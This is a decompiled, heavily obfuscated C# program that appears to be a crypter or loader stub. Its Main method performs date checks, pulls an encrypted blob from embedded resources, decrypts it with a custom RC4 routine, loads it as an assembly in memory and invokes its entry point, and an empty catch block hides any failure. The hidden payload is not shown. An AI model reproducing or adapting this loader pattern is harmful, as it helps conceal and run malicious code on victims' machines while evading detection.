using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Policy;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 472)]
		private struct Struct1
		{
		}

		private static readonly object object_0;

		private static readonly Array array_0;

		private static readonly Array array_1;

		internal static byte byte_0/* Not supported: data(00) */;

		internal static DateTime smethod_0(short short_0, char char_0)
		{
			int num = 0;
			DateTime result;
			int num2;
			do
			{
				result = (((char_0 ^ short_0) - 102) ^ num) switch
				{
					0 => Class12.Class13.smethod_0(732, 662), 
					_ => default(DateTime), 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static char[] smethod_1<T>(T gparam_0, int int_0, char char_0) where T : string
		{
			int num = 0;
			char[] result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 16) ^ num) switch
				{
					0 => (char[])(Array)Class12.Class13.smethod_1((string)gparam_0, '\u036a', (short)793), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static AppDomain smethod_2(char char_0, int int_0)
		{
			int num = 0;
			AppDomain result;
			do
			{
				result = (((int_0 ^ char_0) - 75) ^ num) switch
				{
					0 => (AppDomain)(MarshalByRefObject)Class12.Class13.Class14.smethod_1('\u00b8', 'Õ'), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static object smethod_3<T, U>(T gparam_0, U gparam_1, int int_0, char char_0) where T : AppDomain where U : string
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 3) ^ num) switch
				{
					0 => Class12.smethod_4((AppDomain)gparam_0, (string)gparam_1, 35, (short)122), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		static Class1()
		{
			array_0 = new char[236];
			char[] array = new char[8];
			array[7] = 'භ';
			array[1] = '⻱';
			array[2] = '㑩';
			array[4] = '㕝';
			array[0] = '࿁';
			array[5] = '㪇';
			array[3] = 'じ';
			array[6] = 'Ѣ';
			array_1 = new string[8];
			object_0 = array;
		}
	}

	private static void Main(string[] args)
	{
		Class4.smethod_2();
		if (smethod_1(Class1.smethod_0(948, 'ϒ'), new DateTime(635305920641601562L), 766, 668))
		{
			throw new Exception();
		}
		if (smethod_1(Class1.smethod_0(274, 'Ŵ'), new DateTime(635305919202197265L), 645, 743))
		{
			throw new Exception();
		}
		if (smethod_1(Class1.smethod_0(864, '\u0306'), new DateTime(635305918297783203L), 1012, 918))
		{
			throw new Exception();
		}
		if (smethod_1(Class1.smethod_0(159, 'ù'), new DateTime(635305917402226562L), 556, 590))
		{
			throw new Exception();
		}
		object[] parameters = new object[0];
		Class2.smethod_3(new Random(), 300, 750, 922, 'Ή');
		long num = BabelAttribute.smethod_3(123, '\b');
		_ = BabelAttribute.smethod_3(284, 'ů') - num;
		try
		{
			ResourceManager gparam_ = new ResourceManager(Class2.smethod_0(Class4.smethod_0(Class6.smethod_0(Class10.smethod_0("ྊ\u0f9dྋ", 61782), 58598), 62515), 61156), smethod_2('-', 123));
			byte[] byte_ = smethod_0((byte[])Class4.smethod_4(gparam_, Class2.smethod_0(Class4.smethod_0(Class6.smethod_0(Class10.smethod_0("೭ಆ\u0cd7\u0cc1೬\u0cd2\u0ccd\u0cfc೮\u0cd8\u0ccc\u0cc6\u0cd2\u0ce2\u0cf7\u0ce4\u0cfe", 63353), 60326), 62070), 57866), 192, 211), Class2.smethod_0(Class4.smethod_0(Class6.smethod_0(Class10.smethod_0("ធ\u17c8\u17fe៚ៜរៜ\u17d1២\u17c1\u17c9៲ស\u17de\u17d2\u17cfវ៙\u17d1\u17d1ស\u17ce\u17c5៱\u17c7\u17eeរ\u17fd៲៦\u17cc៣\u17c1០\u17dd៥\u17fe៨៩\u17ca\u17cd៘\u17c7\u17c2\u17c3\u17c8\u17fd\u17ddឞ\u17d2៙\u17c9\u17c2ស\u17faឞ៱ឞ\u17cd", 58683), 57888), 61864), 57809));
			Class12.Class13.smethod_2(gparam_, 1018, 'ω');
			Assembly gparam_2 = (Assembly)(ISerializable)Class12.Class13.smethod_3(byte_, 'B', 91);
			if (Class16.smethod_3((MethodBase)Class12.Class13.smethod_4(gparam_2, 92, 124), '\u02e7', 'ˋ').Length > 0)
			{
				parameters = new object[1] { args };
			}
			Class12.Class13.smethod_4(gparam_2, 591, 623).Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] array = (byte[])(ICollection)Class4.smethod_7(Class4.smethod_5(82, 31), string_0, 43, 78);
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % BabelAttribute.smethod_5((Array)array, 0, '\u02d8', 'ʙ')];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class12.Class15.smethod_3((Array)byte_0, 0, 526, 'Ȯ'); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}

	static Class0()
	{
		Class4.smethod_2();
	}

	internal static bool smethod_1(DateTime dateTime_0, DateTime dateTime_1, int int_0, short short_0)
	{
		int num = 0;
		bool result;
		do
		{
			result = (((int_0 ^ short_0) - 98) ^ num) switch
			{
				0 => Class12.Class13.smethod_5(dateTime_0, dateTime_1, '\u0084', 'ç'), 
				_ => true, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static Assembly smethod_2(char char_0, int int_0)
	{
		int num = 0;
		Assembly result = (((char_0 ^ int_0) - 86) ^ 0) switch
		{
			0 => Class16.smethod_6(692, 'ʒ'), 
			1 => Class16.smethod_6(284, 'ĺ'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_3<T, U>(T gparam_0, U gparam_1, char char_0, short short_0) where T : string where U : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_0 ^ short_0) - 67) ^ num) switch
			{
				0 => (string)(IEnumerable)Class16.smethod_7((string)gparam_0, (string)gparam_1, 'ǧ', 'ǹ'), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_4<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, short short_0, int int_2) where T : Stream
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_2) - 93) ^ num)
			{
			case 0:
				Class16.smethod_8((Stream)gparam_0, byte_0, int_0, int_1, (short)605, 549);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static Evidence smethod_5<T>(T gparam_0, char char_0, short short_0) where T : Assembly
	{
		int num = 0;
		Evidence result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 76) ^ num) switch
			{
				0 => Class12.smethod_6((Assembly)gparam_0, 'T', 38), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static Assembly smethod_6<T>(byte[] byte_0, byte[] byte_1, T gparam_0, short short_0, char char_0) where T : Evidence
	{
		int num = 0;
		Assembly result = (((short_0 ^ char_0) - 23) ^ 0) switch
		{
			0 => Class12.Class15.smethod_4(byte_0, byte_1, (Evidence)gparam_0, 'Ĺ', 'Ŋ'), 
			_ => null, 
		};
		num++;
		return result;
	}
}
